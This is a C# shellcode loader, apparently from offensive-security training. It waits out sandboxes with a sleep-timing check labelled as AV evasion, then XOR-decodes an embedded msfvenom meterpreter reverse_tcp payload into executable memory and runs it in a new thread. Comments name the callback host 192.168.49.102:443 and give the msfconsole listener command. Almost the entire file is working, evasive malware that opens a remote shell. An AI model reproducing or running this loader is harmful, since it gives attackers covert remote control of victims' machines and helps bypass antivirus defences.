using System.Runtime.InteropServices;
using System;

namespace rev
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        public static void Main()
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.102 LPORT=443 EXITFUNC=thread -f ps1
            // XORed with xor_shellcode.py key 0xfa
            // sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.49.102; set lport 443; exploit"
            byte[] buf = new byte[511] {
            0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,
            0xbb,0xaa,0xa8,0xab,0xac,0xb2,0xcb,0x28,0x9f,0xb2,0x71,0xa8,
            0x9a,0xb2,0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0x71,0x88,
            0xaa,0xb2,0xf5,0x4d,0xb0,0xb0,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,
            0x56,0xc6,0x9b,0x86,0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,
            0xfb,0x3b,0x18,0x17,0xa8,0xbb,0xab,0xb2,0x71,0xa8,0xda,0x71,
            0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,0x7b,0x82,0xe2,0xf1,0xf8,0xf5,
            0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,0x72,0xfa,0xfa,0xfa,0xb2,
            0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xbe,0x71,0xba,0xda,0xaa,
            0x71,0xb2,0xe2,0xb3,0xfb,0x2a,0x19,0xac,0xb2,0x05,0x33,0xbb,
            0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,
            0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,0x0b,
            0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,
            0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,
            0x71,0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,
            0x2a,0xbb,0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,
            0xbb,0xa0,0xb2,0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,
            0xa3,0xa0,0xb2,0x71,0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb3,
            0x44,0x8d,0x89,0xc8,0xa5,0xc9,0xc8,0xfa,0xfa,0xbb,0xac,0xb3,
            0x73,0x1c,0xb2,0x7b,0x16,0x5a,0xfb,0xfa,0xfa,0xb3,0x73,0x1f,
            0xb3,0x46,0xf8,0xfa,0xfb,0x41,0x3a,0x52,0xcb,0x9c,0xbb,0xae,
            0xb3,0x73,0x1e,0xb6,0x73,0x0b,0xbb,0x40,0xb6,0x8d,0xdc,0xfd,
            0x05,0x2f,0xb6,0x73,0x10,0x92,0xfb,0xfb,0xfa,0xfa,0xa3,0xbb,
            0x40,0xd3,0x7a,0x91,0xfa,0x05,0x2f,0x90,0xf0,0xbb,0xa4,0xaa,
            0xaa,0xb7,0xcb,0x33,0xb7,0xcb,0x3a,0xb2,0x05,0x3a,0xb2,0x73,
            0x38,0xb2,0x05,0x3a,0xb2,0x73,0x3b,0xbb,0x40,0x10,0xf5,0x25,
            0x1a,0x05,0x2f,0xb2,0x73,0x3d,0x90,0xea,0xbb,0xa2,0xb6,0x73,
            0x18,0xb2,0x73,0x03,0xbb,0x40,0x63,0x5f,0x8e,0x9b,0x05,0x2f,
            0x7f,0x3a,0x8e,0xf0,0xb3,0x05,0x34,0x8f,0x1f,0x12,0x69,0xfa,
            0xfa,0xfa,0xb2,0x79,0x16,0xea,0xb2,0x73,0x18,0xb7,0xcb,0x33,
            0x90,0xfe,0xbb,0xa2,0xb2,0x73,0x03,0xbb,0x40,0xf8,0x23,0x32,
            0xa5,0x05,0x2f,0x79,0x02,0xfa,0x84,0xaf,0xb2,0x79,0x3e,0xda,
            0xa4,0x73,0x0c,0x90,0xba,0xbb,0xa3,0x92,0xfa,0xea,0xfa,0xfa,
            0xbb,0xa2,0xb2,0x73,0x08,0xb2,0xcb,0x33,0xbb,0x40,0xa2,0x5e,
            0xa9,0x1f,0x05,0x2f,0xb2,0x73,0x39,0xb3,0x73,0x3d,0xb7,0xcb,
            0x33,0xb3,0x73,0x0a,0xb2,0x73,0x20,0xb2,0x73,0x03,0xbb,0x40,
            0xf8,0x23,0x32,0xa5,0x05,0x2f,0x79,0x02,0xfa,0x87,0xd2,0xa2,
            0xbb,0xad,0xa3,0x92,0xfa,0xba,0xfa,0xfa,0xbb,0xa2,0x90,0xfa,
            0xa0,0xbb,0x40,0xf1,0xd5,0xf5,0xca,0x05,0x2f,0xad,0xa3,0xbb,
            0x40,0x8f,0x94,0xb7,0x9b,0x05,0x2f,0xb3,0x05,0x34,0x13,0xc6,
            0x05,0x05,0x05,0xb2,0xfb,0x39,0xb2,0xd3,0x3c,0xb2,0x7f,0x0c,
            0x8f,0x4e,0xbb,0x05,0x1d,0xa2,0x90,0xfa,0xa3,0x41,0x1a,0xe7,
            0xd0,0xf0,0xbb,0x73,0x20,0x05,0x2f};
            //byte[] buf = new byte[511] { 0x08, 0xb4, 0x7b, 0x20, 0x0c, 0x14, 0x38, 0xfc, 0xfc, 0xfc, 0xbd, 0xad, 0xbd, 0xac, 0xaa, 0xad, 0xae, 0xb4, 0xcd, 0x2a, 0xa1, 0xb4, 0x73, 0xaa, 0x9c, 0xb4, 0x73, 0xaa, 0xe4, 0xb4, 0x73, 0xaa, 0xdc, 0xb4, 0x73, 0x8a, 0xac, 0xb4, 0xf7, 0x4f, 0xb2, 0xb2, 0xb9, 0xcd, 0x35, 0xb4, 0xcd, 0x3c, 0x58, 0xc8, 0x9d, 0x88, 0xfa, 0xd8, 0xdc, 0xbd, 0x3d, 0x35, 0xf9, 0xbd, 0xfd, 0x3d, 0x1a, 0x19, 0xaa, 0xbd, 0xad, 0xb4, 0x73, 0xaa, 0xdc, 0x73, 0xba, 0xc8, 0xb4, 0xfd, 0x2c, 0x9e, 0x7d, 0x84, 0xe4, 0xf3, 0xfa, 0xf7, 0x81, 0x8a, 0xfc, 0xfc, 0xfc, 0x73, 0x7c, 0x74, 0xfc, 0xfc, 0xfc, 0xb4, 0x81, 0x3c, 0x90, 0x9f, 0xb4, 0xfd, 0x2c, 0xc0, 0x73, 0xbc, 0xdc, 0xac, 0x73, 0xb4, 0xe4, 0xb5, 0xfd, 0x2c, 0x1b, 0xae, 0xb4, 0x07, 0x35, 0xbd, 0x73, 0xd0, 0x74, 0xb4, 0xfd, 0x2e, 0xb9, 0xcd, 0x35, 0xb4, 0xcd, 0x3c, 0x58, 0xbd, 0x3d, 0x35, 0xf9, 0xbd, 0xfd, 0x3d, 0xc4, 0x1c, 0x91, 0x0d, 0xb8, 0xfb, 0xb8, 0xe0, 0xf4, 0xc1, 0xc5, 0x2d, 0x91, 0x24, 0xa4, 0xc0, 0x73, 0xbc, 0xe0, 0xb5, 0xfd, 0x2c, 0x9e, 0xbd, 0x73, 0xf8, 0xb4, 0xc0, 0x73, 0xbc, 0xe8, 0xb5, 0xfd, 0x2c, 0xbd, 0x73, 0x00, 0x74, 0xb4, 0xfd, 0x2c, 0xbd, 0xa4, 0xbd, 0xa4, 0xa6, 0xa5, 0xa2, 0xbd, 0xa4, 0xbd, 0xa5, 0xbd, 0xa2, 0xb4, 0x7b, 0x18, 0xdc, 0xbd, 0xaa, 0x07, 0x1c, 0xa4, 0xbd, 0xa5, 0xa2, 0xb4, 0x73, 0xea, 0x15, 0xb3, 0x07, 0x07, 0x07, 0xa9, 0xb5, 0x46, 0x8f, 0x8b, 0xca, 0xa7, 0xcb, 0xca, 0xfc, 0xfc, 0xbd, 0xae, 0xb5, 0x75, 0x1e, 0xb4, 0x7d, 0x18, 0x5c, 0xfd, 0xfc, 0xfc, 0xb5, 0x75, 0x21, 0xb5, 0x48, 0xfa, 0xfc, 0xfd, 0x43, 0x3c, 0x54, 0xcd, 0x9e, 0xbd, 0xb0, 0xb5, 0x75, 0x20, 0xb8, 0x75, 0x0d, 0xbd, 0x42, 0xb8, 0x8f, 0xde, 0xff, 0x07, 0x31, 0xb8, 0x75, 0x12, 0x94, 0xfd, 0xfd, 0xfc, 0xfc, 0xa5, 0xbd, 0x42, 0xd5, 0x7c, 0x93, 0xfc, 0x07, 0x31, 0x92, 0xf2, 0xbd, 0xa6, 0xac, 0xac, 0xb9, 0xcd, 0x35, 0xb9, 0xcd, 0x3c, 0xb4, 0x07, 0x3c, 0xb4, 0x75, 0x3a, 0xb4, 0x07, 0x3c, 0xb4, 0x75, 0x3d, 0xbd, 0x42, 0x12, 0xf7, 0x27, 0x1c, 0x07, 0x31, 0xb4, 0x75, 0x3f, 0x92, 0xec, 0xbd, 0xa4, 0xb8, 0x75, 0x1a, 0xb4, 0x75, 0x05, 0xbd, 0x42, 0x65, 0x61, 0x90, 0x9d, 0x07, 0x31, 0x81, 0x3c, 0x90, 0xf2, 0xb5, 0x07, 0x36, 0x91, 0x21, 0x14, 0x6b, 0xfc, 0xfc, 0xfc, 0xb4, 0x7b, 0x18, 0xec, 0xb4, 0x75, 0x1a, 0xb9, 0xcd, 0x35, 0x92, 0x00, 0xbd, 0xa4, 0xb4, 0x75, 0x05, 0xbd, 0x42, 0xfa, 0x25, 0x34, 0xa7, 0x07, 0x31, 0x7b, 0x04, 0xfc, 0x86, 0xb1, 0xb4, 0x7b, 0x40, 0xdc, 0xa6, 0x75, 0x0e, 0x92, 0xbc, 0xbd, 0xa5, 0x94, 0xfc, 0xec, 0xfc, 0xfc, 0xbd, 0xa4, 0xb4, 0x75, 0x0a, 0xb4, 0xcd, 0x35, 0xbd, 0x42, 0xa4, 0x60, 0xab, 0x21, 0x07, 0x31, 0xb4, 0x75, 0x3b, 0xb5, 0x75, 0x3f, 0xb9, 0xcd, 0x35, 0xb5, 0x75, 0x0c, 0xb4, 0x75, 0x22, 0xb4, 0x75, 0x05, 0xbd, 0x42, 0xfa, 0x25, 0x34, 0xa7, 0x07, 0x31, 0x7b, 0x04, 0xfc, 0x89, 0xd4, 0xa4, 0xbd, 0xaf, 0xa5, 0x94, 0xfc, 0xbc, 0xfc, 0xfc, 0xbd, 0xa4, 0x92, 0xfc, 0xa2, 0xbd, 0x42, 0xf3, 0xd7, 0xf7, 0xcc, 0x07, 0x31, 0xaf, 0xa5, 0xbd, 0x42, 0x91, 0x96, 0xb9, 0x9d, 0x07, 0x31, 0xb5, 0x07, 0x36, 0x15, 0xc8, 0x07, 0x07, 0x07, 0xb4, 0xfd, 0x3b, 0xb4, 0xd5, 0x3e, 0xb4, 0x81, 0x0e, 0x91, 0x50, 0xbd, 0x07, 0x1f, 0xa4, 0x92, 0xfc, 0xa5, 0x43, 0x1c, 0xe9, 0xd2, 0xf2, 0xbd, 0x75, 0x22, 0x07, 0x31 }; 
            int payloadSize = buf.Length;
            IntPtr payAddr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE, 0);
            if (payAddr == null)
            {
                return;
            }
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Marshal.Copy(buf, 0, payAddr, payloadSize);
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}